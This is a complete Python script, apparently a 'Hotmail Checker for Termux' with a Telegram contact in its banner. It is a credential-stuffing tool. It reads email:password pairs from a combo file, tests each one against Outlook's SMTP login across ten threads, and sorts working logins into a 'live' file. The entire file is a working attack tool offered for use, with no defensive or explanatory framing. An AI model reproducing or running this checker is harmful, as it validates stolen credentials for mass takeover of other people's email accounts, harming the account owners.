import smtplib
import concurrent.futures
import os
import sys
from threading import Lock
from time import sleep

MAX_WORKERS = 10

COMBO_FILE = 'emails.txt'
LIVE_FILE = 'live.txt'
DEAD_FILE = 'dead.txt'

SMTP_SERVER = "smtp-mail.outlook.com"
SMTP_PORT = 587
TIMEOUT = 10

class clr:
    LIGHTYELLOW_EX = '\033[93m'
    LIGHTBLUE_EX = '\033[94m'
    LIGHTCYAN_EX = '\033[96m'
    WHITE = '\033[97m'
    LIGHTRED_EX = '\033[91m'
    CYAN = '\033[36m'
    LIGHTGREEN_EX = '\033[92m'
    RESET = '\033[0m'

def banner():
    banner_text = f"""
{clr.LIGHTYELLOW_EX} _  _ ____ _  _ ____    _  _ _  _ ___  ____ ____
 |\/| |__| |\/| |___    |\/| |  | |__> |___ |__/
 |  | |  | |  | |___    |  | |__| |__> |___ |  \ {clr.WHITE}
=================================================
       {clr.LIGHTRED_EX}Hotmail Checker for Termux{clr.WHITE}
=================================================
 {clr.LIGHTBLUE_EX}Telegram:{clr.LIGHTCYAN_EX} @three63mafia{clr.RESET}
"""
    print(banner_text)

def check_credentials(email, password):
    try:
        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT, timeout=TIMEOUT) as server:
            server.starttls()
            server.login(email, password)
        return True, "Login Success"
    except smtplib.SMTPAuthenticationError:
        return False, "Authentication Failed"
    except smtplib.SMTPException as e:
        return False, f"SMTP Error: {e}"
    except OSError as e:
        return False, f"Network Error: {e}"
    except Exception as e:
        return False, f"An unexpected error occurred: {e}"

def worker(email_pass_combo, live_list, dead_list, lock, stats):
    clean_line = email_pass_combo.strip()
    if ':' not in clean_line:
        return

    email, password = clean_line.split(':', 1)
    
    is_live, message = check_credentials(email, password)

    with lock:
        if is_live:
            live_list.append(clean_line)
            stats['live'] += 1
            status_symbol = f"{clr.LIGHTGREEN_EX}[LIVE]{clr.RESET}"
        else:
            dead_list.append(clean_line)
            stats['dead'] += 1
            status_symbol = f"{clr.LIGHTRED_EX}[DEAD]{clr.RESET}"
        
        progress = f" Checked: {stats['live'] + stats['dead']}/{stats['total']} | Live: {clr.LIGHTGREEN_EX}{stats['live']}{clr.RESET} | Dead: {clr.LIGHTRED_EX}{stats['dead']}{clr.RESET}"
        sys.stdout.write(f"\r{status_symbol} {clr.CYAN}{email}{clr.RESET} -> {message.ljust(30)}{progress}")
        sys.stdout.flush()

def main():
    banner()

    if not os.path.exists(COMBO_FILE):
        print(f"{clr.LIGHTRED_EX}[ERROR]{clr.RESET} Input file '{COMBO_FILE}' not found.")
        sys.exit(1)

    with open(COMBO_FILE, 'r', errors='ignore') as f:
        email_list = f.readlines()

    if not email_list:
        print(f"{clr.LIGHTRED_EX}[ERROR]{clr.RESET} Input file '{COMBO_FILE}' is empty.")
        sys.exit(1)

    live_results = []
    dead_results = []
    file_lock = Lock()
    stats = {'live': 0, 'dead': 0, 'total': len(email_list)}

    print(f"{clr.WHITE}Starting check on {stats['total']} accounts with {MAX_WORKERS} threads...\n")

    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = [executor.submit(worker, combo, live_results, dead_results, file_lock, stats) for combo in email_list]
        concurrent.futures.wait(futures)

    print("\n\n" + "="*49)
    print(f"               {clr.LIGHTCYAN_EX}CHECKING COMPLETE{clr.RESET}                ")
    print("="*49)

    with open(LIVE_FILE, 'w') as f:
        for item in live_results:
            f.write(item + '\n')
    print(f"\n{clr.LIGHTGREEN_EX}[+] Saved {len(live_results)} live accounts to {LIVE_FILE}{clr.RESET}")

    with open(DEAD_FILE, 'w') as f:
        for item in dead_results:
            f.write(item + '\n')
    print(f"{clr.LIGHTRED_EX}[-] Saved {len(dead_results)} dead accounts to {DEAD_FILE}{clr.RESET}\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{clr.LIGHTRED_EX}Process interrupted by user. Exiting...{clr.RESET}")
        sys.exit(0)
